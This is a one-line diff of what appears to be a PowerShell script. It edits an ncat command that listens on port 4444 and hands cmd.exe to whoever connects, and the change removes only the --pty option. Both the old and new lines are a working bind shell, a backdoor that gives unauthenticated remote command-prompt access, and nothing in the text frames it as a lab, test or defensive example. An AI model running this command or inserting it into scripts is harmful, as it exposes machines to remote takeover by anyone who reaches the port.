@@ -1,1 +1,1 @@
-& "C:/Program Files (x86)/Nmap/ncat.exe" --pty -nlkp 4444 -e cmd.exe
+& "C:/Program Files (x86)/Nmap/ncat.exe" -nlkp 4444 -e cmd.exe
